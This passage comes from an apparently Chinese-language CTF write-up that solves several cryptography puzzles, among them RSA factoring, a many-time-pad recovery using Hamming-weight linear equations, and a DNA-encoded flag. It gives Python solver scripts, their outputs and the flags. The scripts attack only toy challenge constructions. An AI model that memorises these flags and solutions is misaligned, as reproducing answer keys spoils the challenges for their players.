<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fv = <span class="number">180966415225520073565056051181248297290575705125476923438739000037655473277</span></span><br><span class="line">flag_bytes = []</span><br><span class="line"><span class="keyword">while</span> fv &gt; <span class="number">0</span>:</span><br><span class="line">    fv, remainder = <span class="built_in">divmod</span>(fv, <span class="number">256</span>)</span><br><span class="line">    flag_bytes.append(remainder)</span><br><span class="line">flag_bytes.reverse()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> flag_bytes)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>flag：<font color=deepskyblue><strong>flag{1t_i3$n0t#diFicult_@t-all}</strong></font>.</p>
<h2 id="ez-HNP："><a href="#ez-HNP：" class="headerlink" title="ez_HNP："></a>ez_HNP：</h2><p>本题公钥n不大，可以直接分解：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">6953568275008329676258828109613762539650527325530995927801460857192130247006862323130968705462697653596124969322108944736820990836508861648601474968768223</span> = <span class="number">65260483526602518839784843845912531242888361084882390874073837444262281165409</span> * <span class="number">106550976934974827530180341120641270147665720222992379243269395852614293066047</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&quot;\x1d\xa73We&#x27;re swaying on horseback,The hills are green,And the birdie&quot;</span></span><br><span class="line"><span class="string">b&quot;s sing,And roses are pink,Experience I never had,I&#x27;m so happy,Ha&quot;</span> </span><br><span class="line"><span class="string">b&#x27;ppy to just be part of your story,After you I follow,After you I&#x27;</span> </span><br><span class="line"><span class="string">b&#x27; follow,The world you show me broaden my horizon,Forever my hero&#x27;</span> </span><br><span class="line"><span class="string">b&#x27;,Forever my hero,I am your biggest fan,I am your biggest fan,Mer&#x27;</span> </span><br><span class="line"><span class="string">b&quot;ry-go-round,In a circle I run,It&#x27;s so much fun leaving reality b&quot;</span></span><br><span class="line"><span class="string">b&#x27;ehind.\r\nI fall down the horseback,With my crippled legs,And then&#x27;</span> </span><br><span class="line"><span class="string">b&quot; it starts to rain,Showing me it&#x27;s all fake,Raindrops wash down &quot;</span> </span><br><span class="line"><span class="string">b&#x27;the facade,Hills are painted,Birdies are robotic,Roses are made &#x27;</span> </span><br><span class="line"><span class="string">b&#x27;of clay,Excitement that I feel,Excitement that I feel,Return the&#x27;</span> </span><br><span class="line"><span class="string">b&#x27;m to the shelf,Cause now I understand,Heroes cannot be real,Hero&#x27;</span> </span><br><span class="line"><span class="string">b&quot;es cannot be real,I wasn&#x27;t who I am,I don&#x27;t know who I am,\xc2\xbfWho &quot;</span> </span><br><span class="line"><span class="string">b&#x27;am I?,\xc2\xbfWho am I?,\xc2\xbfWho am I?\r\nHere we go, another lap,Prizes to&#x27;</span> </span><br><span class="line"><span class="string">b&quot; claim,Here&#x27;s a dream for you,Here&#x27;s a dream for me,Golden ticke&quot;</span></span><br><span class="line"><span class="string">b&#x27;ts(flag&#123;Stand_up,gaL1op_on,N07h1ng_c4n_Be_dOne_by_f33l1nG_5o_5OR&#x27;</span> </span><br><span class="line"><span class="string">b&quot;ry_for_y0ursE1f&#125;) in my bag stay unexchanged,Don&#x27;t you love the &quot;</span> </span><br><span class="line"><span class="string">b&#x27;thrill of the chase?Just let me be your fan,I wanna be your fan,&#x27;</span> </span><br><span class="line"><span class="string">b&quot;I&#x27;m still your biggest fan!\r\nWhy is it that some were given the &quot;</span> </span><br><span class="line"><span class="string">b&#x27;role of villian,The moment they were released into this system?\r&#x27;</span> </span><br><span class="line"><span class="string">b&quot;\nHero,On a plastic horse,Fighting like it&#x27;s real,With a cardboar&quot;</span> </span><br><span class="line"><span class="string">b&#x27;d sword,I know,Successful or not, I am who I am,I am my biggest &#x27;</span> </span><br><span class="line"><span class="string">b&#x27;fan,I am my biggest fan,I am my enemy and my friend.\r\nHero,Gonna&#x27;</span> </span><br><span class="line"><span class="string">b&#x27; prove my version of justice,Is more just than yours,Uno,Remaini&#x27;</span> </span><br><span class="line"><span class="string">b&#x27;ng on this stage, I am the only one,I am my biggest fan,I am my &#x27;</span></span><br></pre></td></tr></table></figure>

<p><font color=deepskyblue><strong>flag{Stand_up,gaL1op_on,N07h1ng_c4n_Be_dOne_by_f33l1nG_5o_5ORry_for_y0ursE1f}</strong></font>.</p>
<h2 id="MTP-again："><a href="#MTP-again：" class="headerlink" title="MTP again："></a>MTP again：</h2><p>观察发现，flag是与和自己一样长度的随机OTP进行了8倍于自己长度的异或，flag原长度为70字节，共计560个二进制位，而密文也有560个，且注意到加密所用到的密钥被严格要求汉明重量为自身长度的一半（即对于560个二进制位，其中有280个1，280个0），则有以下关系：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. HammingWeight(OTP0~560) = 280</span><br><span class="line">2. 由于异或本身的自反性，enc = flag ^ OTP  ⇒  OTP = flag ^ enc</span><br><span class="line">3. HammingWeight(flag ^ enc0~560) = HammingWeight(OTP0~560) = 280</span><br></pre></td></tr></table></figure>
<p>有：</p>
<p><img src="/pictures/npc25_mtp1.png" title="mtp1"><br></p>
<p>又因为异或满足性质：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a xor b = a + b - <span class="number">2</span> * a * b</span><br></pre></td></tr></table></figure>
<p>所以有：</p>
<p><img src="/pictures/npc25_mtp2.png" title="mtp2"><br></p>
<p>化简得到：</p>
<p><img src="/pictures/npc25_mtp3.png" title="mtp3"><br></p>
<p>其中左侧的(1-2*enc)是待求矩阵的系数，flag每一位的取值只能是0或1，等号右侧为常数项，于是我们获得了560个线性方程，而flag恰好有560个二进制位，因此可以得到结果，编写脚本进行解矩阵： </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># 提取密文</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encs = [<span class="built_in">int</span>(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line"><span class="comment"># 转换为矩阵，计算每个密文的汉明重量</span></span><br><span class="line">EncMatrix = []</span><br><span class="line">SumEncs = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> encs:</span><br><span class="line">    bin_str = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">560</span>)</span><br><span class="line">    bits = [<span class="built_in">int</span>(bit) <span class="keyword">for</span> bit <span class="keyword">in</span> bin_str]</span><br><span class="line">    EncMatrix.append(bits)</span><br><span class="line">    SumEncs.append(<span class="built_in">sum</span>(bits))</span><br><span class="line">Coefficient = np.array(EncMatrix, dtype=np.int64) <span class="comment"># 系数矩阵，560*560</span></span><br><span class="line">SumEncs = np.array(SumEncs, dtype=np.int64) <span class="comment">#560个密文的汉明重量</span></span><br><span class="line"><span class="comment"># 枚举flag所有的汉明重量可能值</span></span><br><span class="line"><span class="keyword">for</span> PossibleHW <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">561</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前尝试的flag汉明重量为: <span class="subst">&#123;PossibleHW&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># 检查所有右侧常数项是否为整数且非负</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> np.<span class="built_in">all</span>((SumEncs + PossibleHW - <span class="number">280</span>) % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    Constant = (SumEncs + PossibleHW - <span class="number">280</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> np.<span class="built_in">any</span>(Constant &lt; <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 解线性方程组</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x, residuals, rank, _ = np.linalg.lstsq(Coefficient, Constant, rcond=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">except</span> np.linalg.LinAlgError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 由于精度可能不够高，这里要手动筛分得到的解（二值化）并验证</span></span><br><span class="line">    candidate_b = np.<span class="built_in">round</span>(x).clip(<span class="number">0</span>, <span class="number">1</span>).astype(np.int64)</span><br><span class="line">    <span class="keyword">if</span> np.<span class="built_in">sum</span>(candidate_b) != PossibleHW:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 检查方程组是否近似满足</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> np.allclose(Coefficient.dot(candidate_b), Constant, atol=<span class="number">1e-5</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 转换为字节</span></span><br><span class="line">    flag_bytes = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">560</span>, <span class="number">8</span>):</span><br><span class="line">        byte_bits = candidate_b[i:i+<span class="number">8</span>]</span><br><span class="line">        byte_val = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, byte_bits)), <span class="number">2</span>)</span><br><span class="line">        flag_bytes.append(byte_val)</span><br><span class="line">    <span class="comment"># 解码并验证格式</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = flag_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> flag.startswith(<span class="string">&#x27;flag&#123;&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到汉明重量<span class="subst">&#123;PossibleHW&#125;</span>对应的flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到有效解&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到flag：<font color=deepskyblue><strong>flag{__seesee_Neutrality_of_SEETF_2022_it_is_easy_just_LLL&amp;&amp;algebra__}</strong></font>.</p>
<h2 id="AL-L-IN-MY-GO："><a href="#AL-L-IN-MY-GO：" class="headerlink" title="AL(L IN MY)GO："></a>AL(L IN MY)GO：</h2><p>脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">146978395433283264897813405718660588088322207100229521002893751180722325695978423785658275468431402472435440059035053335098162775145300245682198712763023558673286879552547337644749558781058327465800671817512926008450966581498366956477375308931684786869145630887681611140511534001970600372671544461336706473151</span></span><br><span class="line">c = <span class="number">144091150656791885294463339584727879265256198198991073653628663376156887178012550858130757614613983484915065317350538883976985699134939611573042960790066164023344748678236482688754022510764186756583653133641013319778030947290249842389554899901303923240856508801296856919235057923994680746764691858073309808359</span></span><br><span class="line">a1 = <span class="number">1053418510152174241358999461854322909092508825442671513610563337452117519900867332972692795557266351465654199993733230422011291698479326476444348886243267</span></span><br><span class="line">b1 = -<span class="number">1261279176969765461388571053396373196897687956581882155016691810326904756013409782332270918104859858382015105036126383763303596291887827997773412160241786</span></span><br><span class="line">a2 = -<span class="number">608318421636142476525088004848703046473131220627424101349333216947428225580982260314444310553805070604775654234218115580689241049882824418052182364926009</span></span><br><span class="line">b2 = -<span class="number">508066649413517214369126502601369649992541295266106005724404595564485886689721356446640637437941502925699244645275193681017870974548217184447303220162414</span></span><br><span class="line"></span><br><span class="line">b1_abs = <span class="built_in">abs</span>(b1)</span><br><span class="line">Delta = <span class="number">1</span> + <span class="number">4</span> * b1_abs * a1 * n</span><br><span class="line">sqrt_Delta, tag = gmpy2.iroot(Delta, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> sqrt_Delta * sqrt_Delta == Delta:</span><br><span class="line">    q = (sqrt_Delta - <span class="number">1</span>) // (<span class="number">2</span> * b1_abs)</span><br><span class="line">    <span class="keyword">if</span> n % q == <span class="number">0</span>:</span><br><span class="line">        p = n // q</span><br><span class="line">        phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">        d = inverse(<span class="number">65537</span>, phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;尝试另一个根...&quot;</span>)</span><br><span class="line">        q = (-sqrt_Delta - <span class="number">1</span>) // (<span class="number">2</span> * b1_abs)</span><br><span class="line">        <span class="keyword">if</span> n % q == <span class="number">0</span>:</span><br><span class="line">            p = n // q</span><br><span class="line">            phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">            d = inverse(<span class="number">65537</span>, phi)</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            <span class="built_in">print</span>(flag.decode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;解密失败。&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>运行得到flag：<font color=deepskyblue><strong>flag{5uch_@_simp13_Algo!!!!!rithm_qu3sti0n_willl_not_bee_dificult_4_U!}</strong></font>.</p>
<h2 id="Ave-Mujica-2："><a href="#Ave-Mujica-2：" class="headerlink" title="Ave Mujica 2："></a>Ave Mujica 2：</h2><p>先看题目流程：将flag转换为整数m，然后使用l2d函数将m转换为一个DNA序列dna1，再通过dbp函数得到dna1的互补链dna2，接着对dna2进行两次突变操作，生成十个不同的dna3并输出，而突变有三种情况，每次操作会随机选择其中一种：删除一个随机位置的碱基、在随机位置插入一个随机的碱基、替换一个随机位置的碱基为另一个碱基，则经过两次操作后，最短的情况和最长的情况长度相差为4，列出这十个样本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">AGAGAGCTAGCTAAGACACGCATCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACCA</span><br><span class="line">AGAGAGCTAGTAAGACACGCATCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAGCTCTGTAAATCAGGTAGAAAACCATGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACCA</span><br><span class="line">AGAGACTAGTAAGACACGCATCAACAAACATCTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACCA</span><br><span class="line">AGAGAGCTAGTAAGACACACATCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACCA</span><br><span class="line">AGAGAGCTAGTAAGACACGCATCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGCAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGGTACCA</span><br><span class="line">AGAGAGCTAGTAAGACACGCATCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCCACTGACATAGGAACCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACCA</span><br><span class="line">AGAGAGCTAGTAAGACACGCTCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACCA</span><br><span class="line">AGAGAGCTAGTAAGACACGCATTCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACCA</span><br><span class="line">AGAGAGCTAGTAAGACACGCATCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCAGACTAACAAAGAAACTGAGAAAGATACACA</span><br><span class="line">AGAGAGCTAGTAAGACACGCATCAACAAACATACTCACAAAGCAAGGATCCCATCATAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGCTAACAAAGAAACTGAGAAAGATACCA</span><br></pre></td></tr></table></figure>
<p>则最长的那个去掉多出来的四个字符的其中两个后就是原来的链dna2，编写解密脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbp</span>(<span class="params">d</span>):</span><br><span class="line">    bp = &#123;<span class="string">&quot;A&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;T&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;C&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;G&quot;</span>: <span class="string">&quot;C&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([bp[i] <span class="keyword">for</span> i <span class="keyword">in</span> d])</span><br><span class="line">base = &#123;<span class="string">&quot;A&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;T&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;C&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;G&quot;</span>: <span class="string">&quot;3&quot;</span>&#125;</span><br><span class="line">dna2_p1 = <span class="string">&quot;AGAGA&quot;</span></span><br><span class="line">sus_1 = <span class="string">&quot;G&quot;</span></span><br><span class="line">dna2_p2 = <span class="string">&quot;CTAGTAAGACACGCATCAACAAACAT&quot;</span></span><br><span class="line">sus_2 = <span class="string">&quot;A&quot;</span></span><br><span class="line">dna2_p3 = <span class="string">&quot;CTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGC&quot;</span></span><br><span class="line">sus_3 = <span class="string">&quot;A&quot;</span></span><br><span class="line">dna2_p4 = <span class="string">&quot;GACTAACAAAGAAACTGAGAAAGATAC&quot;</span></span><br><span class="line">sus_4 = <span class="string">&quot;A&quot;</span></span><br><span class="line">dna2_p5 = <span class="string">&quot;CA&quot;</span></span><br><span class="line">sus_indices = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>]</span><br><span class="line">sus_strings = [sus_1, sus_2, sus_3, sus_4]</span><br><span class="line">parts = [dna2_p1, sus_1, dna2_p2, sus_2, dna2_p3, sus_3, dna2_p4, sus_4, dna2_p5]</span><br><span class="line">combinations_to_remove = <span class="built_in">list</span>(itertools.combinations(sus_indices, <span class="number">2</span>))</span><br><span class="line"><span class="keyword">for</span> remove_indices <span class="keyword">in</span> combinations_to_remove:</span><br><span class="line">    new_parts = parts.copy()</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">sorted</span>(remove_indices, reverse=<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">del</span> new_parts[index]</span><br><span class="line">    dna2 = <span class="string">&#x27;&#x27;</span>.join(new_parts)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;互补链dna2:&quot;</span>, dna2)</span><br><span class="line">    dna1 = dbp(dna2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;模板链dna1:&quot;</span>, dna1)</span><br><span class="line">    quad_str = <span class="string">&quot;&quot;</span>.join([base[c] <span class="keyword">for</span> c <span class="keyword">in</span> dna1])</span><br><span class="line">    m = <span class="built_in">int</span>(quad_str, <span class="number">4</span>)</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">互补链dna2: AGAGACTAGTAAGACACGCATCAACAAACATCTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCAGACTAACAAAGAAACTGAGAAAGATACACA</span><br><span class="line">模板链dna1: TCTCTGATCATTCTGTGCGTAGTTGTTTGTAGAGTGTTTCGTTCCTAGGGTAGTTCGGTGACTGTATCCTTGAGACATTTAGTCCATCTTTTGGTCAGTCGGTCGTCTGATTGTTTCTTTGACTCTTTCTATGTGT</span><br><span class="line">Flag: <span class="string">b&quot;fq\x85\x9d\xed5\xd5\xd37V\xd6\x93\xf4\xd6\xf7&#x27;F\x972\x156\x86U\xf66\xf6\xd9\xc5\xd5\x95\xc9\x95\x91\xdd&quot;</span></span><br><span class="line">互补链dna2: AGAGACTAGTAAGACACGCATCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACACA</span><br><span class="line">模板链dna1: TCTCTGATCATTCTGTGCGTAGTTGTTTGTATGAGTGTTTCGTTCCTAGGGTAGTTCGGTGACTGTATCCTTGAGACATTTAGTCCATCTTTTGGTCAGTCGGTCGCTGATTGTTTCTTTGACTCTTTCTATGTGT</span><br><span class="line">Flag: <span class="string">b&#x27;fq\x85\x9d\xed5\xd5\xd1\xcd\xd5\xb5\xa4\xfd5\xbd\xc9\xd1\xa5\xcc\x85M\xa1\x95&#125;\x8d\xbd\xb9\xc5\xd5\x95\xc9\x95\x91\xdd&#x27;</span></span><br><span class="line">互补链dna2: AGAGACTAGTAAGACACGCATCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCAGACTAACAAAGAAACTGAGAAAGATACCA</span><br><span class="line">模板链dna1: TCTCTGATCATTCTGTGCGTAGTTGTTTGTATGAGTGTTTCGTTCCTAGGGTAGTTCGGTGACTGTATCCTTGAGACATTTAGTCCATCTTTTGGTCAGTCGGTCGTCTGATTGTTTCTTTGACTCTTTCTATGGT</span><br><span class="line">Flag: <span class="string">b&#x27;fq\x85\x9d\xed5\xd5\xd1\xcd\xd5\xb5\xa4\xfd5\xbd\xc9\xd1\xa5\xcc\x85M\xa1\x95&#125;\x8d\xbd\xb6quered&#125;&#x27;</span></span><br><span class="line">互补链dna2: AGAGAGCTAGTAAGACACGCATCAACAAACATCTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACACA</span><br><span class="line">模板链dna1: TCTCTCGATCATTCTGTGCGTAGTTGTTTGTAGAGTGTTTCGTTCCTAGGGTAGTTCGGTGACTGTATCCTTGAGACATTTAGTCCATCTTTTGGTCAGTCGGTCGCTGATTGTTTCTTTGACTCTTTCTATGTGT</span><br><span class="line">Flag: <span class="string">b&#x27;flag&#123;Mut\xcd\xd5\xb5\xa4\xfd5\xbd\xc9\xd1\xa5\xcc\x85M\xa1\x95&#125;\x8d\xbd\xb9\xc5\xd5\x95\xc9\x95\x91\xdd&#x27;</span></span><br><span class="line">互补链dna2: AGAGAGCTAGTAAGACACGCATCAACAAACATCTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCAGACTAACAAAGAAACTGAGAAAGATACCA</span><br><span class="line">模板链dna1: TCTCTCGATCATTCTGTGCGTAGTTGTTTGTAGAGTGTTTCGTTCCTAGGGTAGTTCGGTGACTGTATCCTTGAGACATTTAGTCCATCTTTTGGTCAGTCGGTCGTCTGATTGTTTCTTTGACTCTTTCTATGGT</span><br><span class="line">Flag: <span class="string">b&#x27;flag&#123;Mut\xcd\xd5\xb5\xa4\xfd5\xbd\xc9\xd1\xa5\xcc\x85M\xa1\x95&#125;\x8d\xbd\xb6quered&#125;&#x27;</span></span><br><span class="line">互补链dna2: AGAGAGCTAGTAAGACACGCATCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACCA</span><br><span class="line">模板链dna1: TCTCTCGATCATTCTGTGCGTAGTTGTTTGTATGAGTGTTTCGTTCCTAGGGTAGTTCGGTGACTGTATCCTTGAGACATTTAGTCCATCTTTTGGTCAGTCGGTCGCTGATTGTTTCTTTGACTCTTTCTATGGT</span><br><span class="line">Flag: <span 